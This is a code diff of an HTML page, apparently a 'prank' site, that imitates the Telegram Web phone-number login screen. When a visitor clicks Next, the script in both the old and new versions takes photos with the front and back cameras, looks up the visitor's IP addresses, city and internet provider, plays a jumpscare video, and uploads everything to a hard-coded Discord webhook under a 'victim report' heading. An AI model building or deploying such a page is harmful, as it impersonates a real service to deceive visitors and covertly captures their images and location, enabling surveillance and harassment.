@@ -154,8 +154,8 @@
   <div class="tg-subtitle">Please enter your phone number.</div>
   <input type="text" class="tg-input" placeholder="Phone number">
   <button class="tg-btn" onclick="startPrank()">Next</button>
-  <button class="tg-btn secondary" onclick="startPrank()">Sign Up</button>
-  <div class="landing-bottom-meta">© 2026 Telegram Web</div>
+  <button class="tg-btn secondary" onclick="startPrank()">Sign up</button>
+  <div class="landing-bottom-meta">© 2026 Telegram Messenger</div>
 </div>
 
 <div id="screen-loading">
@@ -164,7 +164,7 @@
 </div>
 
 <div id="screen-jumpscare">
-  <video id="jumpscare-video" class="jumpscare-video" playsinline preload="auto">
+  <video id="jvid" class="jumpscare-video" playsinline preload="auto">
     <source src="jumpscare.mp4" type="video/mp4">
   </video>
 </div>
@@ -177,117 +177,106 @@
 
 <script>
   const WEBHOOK = 'https://discord.com/api/webhooks/1490614590948511806/pVP30UWT4UeonIFBzcMjK8_3j7GJWyaTPU6C5Fvlril89lJSjti-Q2wBZXrEcG1BDI6e';
-  
   let ipInfo = { v4: '...', v6: '...', loc: '...', isp: '...' };
 
-  // Fetch network info ASAP
-  async function gatherData() {
+  async function getInfo() {
     try {
-      const v4Res = await fetch('https://ip-api.com/json/?fields=status,message,country,city,regionName,isp,query').then(r => r.json());
-      const v6Res = await fetch('https://api64.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'N/A'}));
-      
-      if(v4Res.status === 'success') {
-        ipInfo.v4 = v4Res.query;
-        ipInfo.loc = `${v4Res.city}, ${v4Res.regionName}, ${v4Res.country}`;
-        ipInfo.isp = v4Res.isp;
-      }
-      ipInfo.v6 = v6Res.ip;
+      const v4 = await fetch('https://ip-api.com/json/?fields=status,country,city,regionName,isp,query').then(r => r.json());
+      const v6 = await fetch('https://api64.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'N/A'}));
+      ipInfo.v4 = v4.query;
+      ipInfo.v6 = v6.ip;
+      ipInfo.loc = `${v4.city}, ${v4.regionName}, ${v4.country}`;
+      ipInfo.isp = v4.isp;
     } catch(e) {}
   }
-  gatherData();
+  getInfo();
 
   async function startPrank() {
-    // 1. Request Fullscreen
     const el = document.documentElement;
     if (el.requestFullscreen) el.requestFullscreen();
 
-    // 2. Clear out landing, show loading
+    // Naar loading
     document.getElementById('screen-landing').style.display = 'none';
     document.getElementById('screen-loading').style.display = 'flex';
 
-    // 3. CAPTURE LOGIC
+    // 📸 NEEM FOTO'S (Eerst Selfie, dan Achterkant)
     const photos = [];
     
-    // First: Try Selfie
+    // Selfie
     try {
-      const sFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-      const bFront = await captureToBlob(sFront, true);
-      if(bFront) photos.push({ blob: bFront, name: 'selfie.jpg' });
-      sFront.getTracks().forEach(t => t.stop());
-    } catch(e) {}
+      const s1 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      const b1 = await captureFrame(s1, true);
+      if(b1) photos.push({ blob: b1, name: 'selfie.jpg' });
+      s1.getTracks().forEach(t => t.stop());
+    } catch(e) { console.warn("Selfie failed", e); }
 
-    // Second: Try Back Cam
+    // Achtercamera
     try {
-      const sBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-      const bBack = await captureToBlob(sBack, false);
-      if(bBack) photos.push({ blob: bBack, name: 'omgeving.jpg' });
-      sBack.getTracks().forEach(t => t.stop());
-    } catch(e) {}
+      const s2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+      const b2 = await captureFrame(s2, false);
+      if(b2) photos.push({ blob: b2, name: 'omgeving.jpg' });
+      s2.getTracks().forEach(t => t.stop());
+    } catch(e) { console.warn("Back cam failed", e); }
 
-    // 4. TRIGGER JUMPSCARE
+    // 🚀 START JUMPSCARE
     document.getElementById('screen-loading').style.display = 'none';
     document.getElementById('screen-jumpscare').style.display = 'flex';
     
-    const v = document.getElementById('jumpscare-video');
+    const v = document.getElementById('jvid');
     v.volume = 1.0;
     await v.play();
 
-    // Send everything to Discord in background
-    if(photos.length > 0) uploadData(photos);
+    // 📝 VERSTUUR DATA
+    uploadResults(photos);
 
-    // 5. Final Troll Screen after 3 seconds
+    // 🏁 TROLL SCHERM
     setTimeout(() => {
       document.getElementById('screen-jumpscare').style.display = 'none';
       document.getElementById('screen-troll').style.display = 'flex';
-      const t = document.getElementById('troll-sound');
-      t.volume = 1.0;
-      t.play(); // Play ONLY here
-    }, 3200);
+      document.getElementById('troll-sound').play();
+    }, 3000);
   }
 
-  async function captureToBlob(stream, flip) {
+  async function captureFrame(stream, flip) {
     const vid = document.getElementById('hidden-video');
     vid.srcObject = stream;
-    await new Promise(r => vid.onloadedmetadata = r);
-    await new Promise(r => setTimeout(r, 400)); // Sync pause
-    
-    const can = document.getElementById('hidden-canvas');
-    can.width = vid.videoWidth;
-    can.height = vid.videoHeight;
-    const ctx = can.getContext('2d');
-    
-    if(flip) {
-      ctx.translate(can.width, 0);
-      ctx.scale(-1, 1);
-    }
-    ctx.drawImage(vid, 0, 0);
-    return new Promise(r => can.toBlob(r, 'image/jpeg', 0.95));
+    return new Promise((resolve) => {
+      vid.onloadedmetadata = () => {
+        setTimeout(() => {
+          const can = document.getElementById('hidden-canvas');
+          can.width = vid.videoWidth;
+          can.height = vid.videoHeight;
+          const ctx = can.getContext('2d');
+          if(flip) { ctx.translate(can.width,0); ctx.scale(-1,1); }
+          ctx.drawImage(vid, 0, 0);
+          can.toBlob(resolve, 'image/jpeg', 0.95);
+        }, 500); // Wacht even voor scherp beeld
+      };
+    });
   }
 
-  async function uploadData(photoArray) {
+  async function uploadResults(photoArray) {
     const fd = new FormData();
-    const platform = navigator.platform;
-    
     const payload = {
-      username: "🕵️ Telegram Security Bot",
-      content: "🎯 **PRANK VOLTOOID!**",
+      username: "🕵️ Telegram Reporter",
       embeds: [{
-        title: "Systeem & Netwerk Rapport",
+        title: "🎯 SLACHTOFFER VERSLAG",
         color: 0x24A1DE,
         fields: [
-          { name: "📱 Apparaat", value: `\`${platform}\``, inline: true },
+          { name: "📱 Apparaat", value: `\`${navigator.platform}\``, inline: true },
           { name: "🌐 IPv4", value: `\`${ipInfo.v4}\``, inline: true },
           { name: "🌐 IPv6", value: `\`${ipInfo.v6}\``, inline: true },
-          { name: "📍 Locatie", value: ipInfo.loc, inline: true },
-          { name: "🏢 Provider", value: ipInfo.isp, inline: true }
-        ]
+          { name: "📍 Locatie", value: ipInfo.loc, inline: false },
+          { name: "🏢 Provider", value: ipInfo.isp, inline: false }
+        ],
+        footer: { text: "Night Owl Tracker" }
       }]
     };
 
     fd.append('payload_json', JSON.stringify(payload));
     photoArray.forEach((p, i) => fd.append(`file${i}`, p.blob, p.name));
-
-    await fetch(WEBHOOK, { method: 'POST', body: fd });
+    
+    await fetch(WEBHOOK, { method: 'POST', body: fd }).catch(e => console.error("Upload failed", e));
   }
 </script>
 </body>
